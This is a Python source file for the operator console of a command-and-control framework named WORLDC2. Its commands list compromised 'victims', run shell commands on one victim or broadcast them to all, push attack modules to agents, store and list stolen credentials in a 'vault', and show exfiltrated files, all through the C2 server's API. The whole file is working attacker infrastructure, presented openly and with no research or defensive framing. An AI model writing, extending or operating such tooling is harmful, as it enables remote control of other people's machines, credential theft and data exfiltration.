#!/usr/bin/env python3
"""
WORLDC2 Interactive Console — CLI shell for C2 operations.

Usage:
    python3 scripts/console.py                        # localhost
    python3 scripts/console.py --server 192.168.1.100:9090
    python3 scripts/console.py -u operator -p pass123

Commands:
    sessions              List active victims
    interact <id|name>    Drop into interactive shell with victim
    shell <id> <cmd>      Run single command on victim
    broadcast <cmd>       Run command on all victims
    modules               List available dynamic modules
    push [id] <module>    Push a module to a victim (auto-detects in interact mode)
    vault add <json>      Store credential
    vault search <q>      Search credentials
    vault list            List all credentials
    files                 List exfiltrated files
    listeners             Show active listeners
    health                Server health check
    help                  Show this help
    exit                  Quit
"""

import os, sys, json, base64, cmd, shlex, readline, getpass, argparse, time
import urllib.request
import urllib.error

GREEN  = "\033[92m"; BLUE = "\033[94m"; YELLOW = "\033[93m"
RED    = "\033[91m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

class WORLDC2Console(cmd.Cmd):
    intro = f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║           WORLDC2 Interactive Console            ║
   ║           ruby570bocadito                     ║
   ╚══════════════════════════════════════════════╝
{RESET}
Type {GREEN}help{RESET} to see available commands.
"""
    prompt = f"{BOLD}{GREEN}worldc2{RESET} > "

    def __init__(self, server, user, password):
        super().__init__()
        self.server = server.rstrip("/")
        self.user = user
        self.password = password
        self.token = None
        self.refresh_token = None
        self.token_expires_at = 0
        self.current_session = None
        self.session_prompt = ""

        # History file
        self.histfile = os.path.expanduser("~/.bty_history")
        try:
            readline.read_history_file(self.histfile)
            readline.set_history_length(1000)
        except:
            pass

    def _login(self):
        """Authenticate with the server and obtain JWT tokens."""
        url = f"{self.server}/api/login"
        data = json.dumps({"username": self.user, "password": self.password}).encode()
        headers = {"Content-Type": "application/json"}
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                resp = json.loads(r.read())
                self.token = resp.get("token")
                self.refresh_token = resp.get("refresh_token")
                self.token_expires_at = time.time() + resp.get("expires_in", 43200)
                return True
        except urllib.error.HTTPError as e:
            return False
        except Exception as e:
            return False

    def _refresh(self):
        """Refresh the access token using the refresh token."""
        if not self.refresh_token:
            return False
        url = f"{self.server}/api/refresh"
        data = json.dumps({"refresh_token": self.refresh_token}).encode()
        headers = {"Content-Type": "application/json"}
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                resp = json.loads(r.read())
                self.token = resp.get("token")
                self.token_expires_at = time.time() + resp.get("expires_in", 43200)
                return True
        except:
            return False

    def _ensure_token(self):
        """Ensure we have a valid token, refreshing if necessary."""
        if not self.token or time.time() > self.token_expires_at - 60:
            if not self._refresh():
                return self._login()
        return True

    def _api(self, method, path, data=None):
        if not self._ensure_token():
            return {"error": "Authentication failed"}

        url = f"{self.server}{path}"
        headers = {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read())
        except urllib.error.HTTPError as e:
            if e.code == 401:
                # Token might be invalid, try to refresh
                self.token = None
                if self._refresh():
                    # Retry with new token
                    headers["Authorization"] = f"Bearer {self.token}"
                    req = urllib.request.Request(url, data=data.encode() if data else None, headers=headers, method=method)
                    try:
                        with urllib.request.urlopen(req, timeout=30) as r:
                            return json.loads(r.read())
                    except urllib.error.HTTPError as e2:
                        return {"error": f"HTTP {e2.code}: {e2.reason}"}
            return {"error": f"HTTP {e.code}: {e.reason}"}
        except Exception as e:
            return {"error": str(e)}

    def _get_sessions(self):
        return self._api("GET", "/api/sessions") or []

    def _find_session(self, identifier):
        sessions = self._get_sessions()
        for s in sessions:
            if s.get("ID") == identifier or s.get("Hostname") == identifier or s.get("AgentID") == identifier:
                return s
            if identifier.lower() in (s.get("Hostname","")).lower():
                return s
        return None

    def _format_table(self, headers, rows):
        widths = [len(h) for h in headers]
        for row in rows:
            for i, cell in enumerate(row):
                widths[i] = max(widths[i], len(str(cell)))
        sep = "+" + "+".join("-" * (w+2) for w in widths) + "+"
        header = "|" + "|".join(f" {h:<{w}} " for h, w in zip(headers, widths)) + "|"
        lines = [sep, header, sep]
        for row in rows:
            lines.append("|" + "|".join(f" {str(c):<{w}} " for c, w in zip(row, widths)) + "|")
        lines.append(sep)
        return "\n".join(lines)

    def do_sessions(self, arg):
        """List active victims."""
        sessions = self._get_sessions()
        if not sessions:
            print(f"{YELLOW}No active sessions{RESET}")
            return
        rows = []
        for s in sessions:
            status = f"{GREEN}●{RESET}" if s.get("State") == "active" else f"{RED}○{RESET}"
            rows.append([
                s.get("ID","?")[:12],
                s.get("Hostname","?")[:20],
                s.get("Username","?")[:12],
                s.get("OS","?")[:8],
                status,
                str(s.get("TaskCount",0))
            ])
        print(self._format_table(["ID","Hostname","User","OS","St","Tasks"], rows))

    def do_interact(self, arg):
        """Drop into shell with a victim. Usage: interact <id|hostname>"""
        if not arg:
            print(f"{RED}Usage: interact <session_id|hostname>{RESET}")
            return
        session = self._find_session(arg.strip())
        if not session:
            print(f"{RED}Session not found: {arg}{RESET}")
            return
        self.current_session = session
        host = session.get("Hostname","?")
        user = session.get("Username","?")
        sid = session.get("ID", "unknown")
        self.prompt = f"{BOLD}{CYAN}[{sid[:8]}] {user}@{host}{RESET} > "
        print(f"{GREEN}Interacting with {host} ({sid[:12]}...){RESET}")
        print(f"{YELLOW}Type 'background' to return, 'exit' to quit{RESET}")

    def do_background(self, arg):
        """Return to main console from session interaction."""
        self.current_session = None
        self.prompt = f"{BOLD}{GREEN}worldc2{RESET} > "
        print(f"{GREEN}Back to main console{RESET}")

    def do_shell(self, arg):
        """Run command on victim. Usage: shell <id> <command>"""
        parts = shlex.split(arg)
        if len(parts) < 2:
            print(f"{RED}Usage: shell <id|hostname> <command>{RESET}")
            return
        sid, cmd = parts[0], " ".join(parts[1:])
        session = self._find_session(sid)
        if not session:
            print(f"{RED}Session not found: {sid}{RESET}")
            return
        result = self._api("POST", "/api/cmd", json.dumps({"agent_id": session["ID"], "command": cmd, "timeout": 30}))
        if result.get("success"):
            print(result.get("output", ""))
        else:
            print(f"{RED}Error: {result.get('error_message', result.get('error','Unknown'))}{RESET}")

    def do_broadcast(self, arg):
        """Run command on ALL victims."""
        if not arg:
            print(f"{RED}Usage: broadcast <command>{RESET}")
            return
        result = self._api("POST", "/api/broadcast", json.dumps({"command": arg.strip()}))
        if isinstance(result, dict) and "error" not in result:
            for sid, output in result.items():
                if isinstance(output, dict) and output.get("success"):
                    print(f"{GREEN}[{sid[:8]}] →{RESET} {output.get('output','')[:200]}")
                else:
                    print(f"{RED}[{sid[:8]}] ✗{RESET}")
        elif isinstance(result, dict) and "error" in result:
            print(f"{RED}Broadcast error: {result['error']}{RESET}")
        else:
            print(f"{RED}Unexpected broadcast response{RESET}")

    def do_vault(self, arg):
        """Credential vault: add <json> | search <q> | list"""
        parts = shlex.split(arg)
        if not parts:
            return self.do_help("vault")
        sub = parts[0]
        if sub == "add" and len(parts) >= 2:
            try:
                data = json.loads(" ".join(parts[1:]))
            except:
                print(f"{RED}Invalid JSON. Example: vault add '{{\"username\":\"admin\",\"password\":\"Pass123\",\"domain\":\"CORP\"}}'{RESET}")
                return
            r = self._api("POST", "/api/vault", json.dumps(data))
            print(f"{GREEN}Stored: {r.get('id','?')}{RESET}")
        elif sub == "search" and len(parts) >= 2:
            q = parts[1]
            results = self._api("GET", f"/api/vault?q={q}")
            for c in (results or []):
                print(f"  {GREEN}{c.get('username')}{RESET} : {c.get('password')} @ {c.get('domain')}\\{c.get('host')} [{c.get('service')}]")
        elif sub == "list":
            results = self._api("GET", "/api/vault") or []
            for c in results:
                print(f"  {c.get('username','?')}:{c.get('password','?')} @ {c.get('domain','?')}\\{c.get('host','?')} [{c.get('service','?')}]")
        else:
            print(f"{YELLOW}vault add <json> | vault search <q> | vault list{RESET}")

    def do_files(self, arg):
        """List exfiltrated files."""
        files = self._api("GET", "/api/files") or []
        if not files:
            print(f"{YELLOW}No files{RESET}")
            return
        for f in files:
            size = f.get("Size",0)
            unit = "MB" if size > 1e6 else "KB" if size > 1e3 else "B"
            s = size/1e6 if unit=="MB" else size/1e3 if unit=="KB" else size
            print(f"  {f.get('Filename','?'):30s} {s:6.1f} {unit}  {f.get('Module','?')}")

    def do_modules(self, arg):
        """List available dynamic modules on C2 server."""
        modules = self._api("GET", "/api/modules") or []
        if not modules:
            print(f"{YELLOW}No modules available{RESET}")
            return
        print(f"\n{BOLD}Available modules ({len(modules)}):{RESET}\n")
        for m in modules:
            cmds = ', '.join(m.get('commands',[]))
            plat = m.get('platform','all')
            print(f"  {GREEN}{m['name']:15s}{RESET} v{m.get('version','?')} [{plat}]")
            print(f"    {m.get('description','')[:80]}")
            print(f"    {CYAN}Commands:{RESET} {cmds}")
            print()

    def do_push(self, arg):
        """Push a dynamic module to an agent. Usage: push [agent_id] <module_name>"""
        parts = arg.strip().split()
        if len(parts) < 1:
            print(f"{RED}Usage: push [agent_id] <module_name>{RESET}")
            print(f"  If in interact mode, agent_id is auto-detected")
            return

        if len(parts) == 1:
            module = parts[0]
            if not self.current_session:
                print(f"{RED}No agent selected. Use: push <agent_id> <module>{RESET}")
                return
            agent_id = self.current_session["ID"]
        else:
            agent_id = parts[0]
            module = parts[1]

        # Resolve agent_id if it's a hostname
        session = self._find_session(agent_id)
        if session:
            agent_id = session["ID"]

        print(f"{BLUE}Pushing '{module}' to {agent_id[:12]}...{RESET}")
        result = self._api("POST", "/api/modules/push",
            json.dumps({"module": module, "agent_id": agent_id}))

        if result.get("status") == "pushed":
            print(f"{GREEN}✓ Module '{module}' pushed successfully{RESET}")
            if result.get("success"):
                print(f"  Agent response: {result.get('output','')[:200]}")
        elif result.get("error"):
            print(f"{RED}✗ {result['error']}{RESET}")
        else:
            print(f"{RED}✗ Failed to push module{RESET}")

    def do_listeners(self, arg):
        """Show active C2 listeners."""
        h = self._api("GET", "/api/health")
        if h:
            print(f"  Active listeners: {h.get('listeners',0)}")
            print(f"  Sessions: {h.get('active_sessions',0)}")
            print(f"  Status: {h.get('status','?')}")

    def do_health(self, arg):
        """Server health check."""
        h = self._api("GET", "/api/health")
        print(json.dumps(h, indent=2))

    def do_exit(self, arg):
        """Quit console."""
        readline.write_history_file(self.histfile)
        print(f"\n{GREEN}Goodbye.{RESET}")
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

    def do_EOF(self, arg):
        print()
        return self.do_exit(arg)

    # Override default to handle interactive session commands
    def default(self, line):
        if self.current_session:
            # User is in an interactive session — send command to victim
            sid = self.current_session["ID"]
            result = self._api("POST", "/api/cmd", json.dumps({"agent_id": sid, "command": line.strip(), "timeout": 30}))
            if result.get("success"):
                output = result.get("output", "")
                if output:
                    print(output)
            elif result.get("error"):
                print(f"{RED}{result['error']}{RESET}")
            else:
                print(f"{RED}Error: {result.get('error_message','Unknown')}{RESET}")
        else:
            print(f"{RED}Unknown command: {line}{RESET}")
            print(f"  Type {GREEN}help{RESET} to see available commands.")

    def emptyline(self):
        pass

    def completenames(self, text, *ignored):
        commands = ["sessions","interact","shell","broadcast","vault","files","listeners","health","help","exit","background","modules","push"]
        if self.current_session:
            commands = ["background","exit","help"] + commands
        return [c for c in commands if c.startswith(text)]


def main():
    p = argparse.ArgumentParser(description="WORLDC2 Interactive Console")
    p.add_argument("--server", "-s", default="http://127.0.0.1:9090", help="C2 API server URL")
    p.add_argument("--user", "-u", default="admin", help="Operator username")
    p.add_argument("--password", "-p", default=None, help="Operator password (prompt if not set)")
    args = p.parse_args()

    password = args.password or getpass.getpass(f"Password for {args.user}: ")

    console = WORLDC2Console(args.server, args.user, password)

    # Login
    if not console._login():
        print(f"{RED}Authentication failed for {args.user}{RESET}")
        sys.exit(1)

    # Health check
    h = console._api("GET", "/api/health")
    if h.get("error"):
        print(f"{RED}Cannot connect to {args.server}: {h['error']}{RESET}")
        sys.exit(1)

    print(f"{GREEN}Connected to {args.server}{RESET}")
    print(f"  Sessions: {h.get('active_sessions',0)} | Listeners: {h.get('listeners',0)}")
    print(f"  User: {args.user}")
    print()

    try:
        console.cmdloop()
    except KeyboardInterrupt:
        console.do_exit("")


if __name__ == "__main__":
    main()
